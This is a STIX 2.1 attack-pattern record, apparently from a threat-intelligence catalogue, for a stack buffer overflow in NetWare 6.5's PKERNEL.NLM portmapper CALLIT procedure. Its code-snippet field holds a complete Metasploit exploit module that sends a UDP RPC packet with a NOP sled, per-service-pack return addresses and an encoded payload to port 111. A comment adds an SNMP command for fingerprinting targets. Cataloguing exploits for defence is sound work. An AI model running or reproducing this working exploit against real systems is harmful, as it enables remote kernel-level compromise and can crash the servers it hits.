{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c89c6bfb-30bf-498b-9688-96228096beaa",
    "created": "2024-08-14T16:34:02.247151Z",
    "modified": "2024-08-14T16:34:02.247155Z",
    "name": "NetWare 6.5 SunRPC Portmapper CALLIT Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the NetWare PKERNEL.NLM driver's CALLIT procedure. PKERNEL.NLM is installed by default on all NetWare servers to support NFS. The PKERNEL.NLM module runs in kernel mode so a failed exploit attempt can cause the operating system to reboot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/netware/sunrpc/pkernel_callit.rb",
            "external_id": "pkernel_callit.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NetWare 6.5 SunRPC Portmapper CALLIT Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the NetWare PKERNEL.NLM driver's CALLIT procedure.\n        PKERNEL.NLM is installed by default on all NetWare servers to support NFS.\n        The PKERNEL.NLM module runs in kernel mode so a failed exploit attempt can\n        cause the operating system to reboot.\n      },\n      'Author'         => [ 'pahtzo', ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # There is no CVE for this vulnerability\n          [ 'BID', '36564' ],\n          [ 'OSVDB', '58447' ],\n          [ 'ZDI', '09-067' ],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2020,\n        },\n      'Platform'       => 'netware',\n      'Targets'        =>\n        [\n          # NetWare SP and PKERNEL.NLM version can be found in SNMP:\n          # snmpwalk -Os -c public -v 1 [target hostname] | egrep -i \"sysdescr|pkernel.nlm\"\n          # sysDescr.0 = STRING: Novell NetWare 5.70.08  October 3, 2008\n          # hrSWRunName.1191394992 = STRING: \"PKERNEL.NLM  v15.01  (20081014)\"\n          [ 'NetWare 6.5 SP2', { 'Ret' => 0xb2329b98 } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP3', { 'Ret' => 0xb234a268 } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP4', { 'Ret' => 0xbabc286c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP5', { 'Ret' => 0xbabc9c3c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP6', { 'Ret' => 0x823c835c } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP7', { 'Ret' => 0x823c83fc } ], # push esp - ret (libc.nlm)\n          [ 'NetWare 6.5 SP8', { 'Ret' => 0x823C870C } ], # push esp - ret (libc.nlm)\n        ],\n\n      'DisclosureDate' => '2009-09-30'))\n\n    register_options([Opt::RPORT(111)])\n  end\n\n  def exploit\n    connect_udp\n\n    buf =  [rand(0xffffffff)].pack('N') # XID\n    buf << [0].pack('N')                # Message Type: Call (0)\n    buf << [2].pack('N')                # RPC Version: 2\n    buf << [100000].pack('N')           # Program: Portmap (100000)\n    buf << [2].pack('N')                # Program Version: 2\n    buf << [5].pack('N')                # Procedure: CALLIT (5)\n    buf << [0].pack('N')                # Credentials AUTH_NULL (0)\n    buf << [0].pack('N')                # Length: 0\n    buf << [0].pack('N')                # Verifier AUTH_NULL (0)\n    buf << [0].pack('N')                # Length: 0\n    buf << [0].pack('N')                # Program: Unknown (0)\n    buf << [1].pack('N')                # Version: 1\n    buf << [1].pack('N')                # Procedure: proc-1 (1)\n    buf << [4097].pack('N')             # Arguments: <DATA> length: 4097\n\n    buf << make_nops(2072)              # fill to ret\n    buf << [target.ret].pack('V')       # addr. of push esp - ret\n    buf << payload.encoded              #\n\n#        print_status(\"payload space #{payload_space()}...\")\n#        print_status(\"payload len #{payload.encoded.length}...\")\n#        print_status(\"total buf len #{buf.length}...\")\n\n    print_status(\"Trying target #{target.name}...\")\n\n    udp_sock.put(buf)\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-30",
    "x_mitre_platforms": [
        "netware'"
    ]
}